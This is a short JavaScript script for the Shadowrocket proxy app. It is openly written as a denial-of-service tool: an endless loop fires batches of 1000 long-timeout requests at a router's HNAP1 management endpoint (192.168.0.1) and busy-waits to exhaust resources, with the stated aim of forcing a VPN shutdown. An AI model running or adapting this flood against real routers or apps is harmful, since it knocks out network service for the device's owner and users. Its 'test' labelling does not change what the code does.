// Shadowrocket Script - Traffic Generation with Timeout and Resource Exhaustion

// Define the URL pattern to listen for
const urlPattern = /^http:\/\/192\.168\.0\.1\/HNAP1\/$/;

// Function to handle the HTTP request and generate traffic with potential resource exhaustion
function generateTrafficWithTimeouts() {
    // Infinite loop to continuously generate traffic
    while (true) {
        // Create a large number of parallel requests
        for (let i = 0; i < 1000; i++) {
            $httpClient.get({
                url: "http://192.168.0.1/HNAP1/",
                timeout: 60000,  // Set a high timeout value to hang requests
                headers: {
                    "User-Agent": "Shadowrocket-Timeout-Test",
                    "X-Timeout-Test": "true"
                }
            }, function(error, response, data) {
                if (error) {
                    // Simulate a critical error if a timeout or other error occurs
                    console.log("Simulated error: " + error);
                    if (error === "timeout") {
                        $done({error: "Timeout simulated to force VPN shutdown"});
                    }
                } else {
                    // Log success (optional)
                    console.log("Request succeeded with status: " + response.status);
                }
            });
        }

        // Sleep between batches to increase system stress
        sleep(500);  // Short sleep to allow for resource exhaustion
    }
}

// Simulate sleep/delay function
function sleep(ms) {
    const start = Date.now();
    while (Date.now() - start < ms) {
        // Busy wait
    }
}

// Run the traffic generation function with potential timeouts
generateTrafficWithTimeouts();
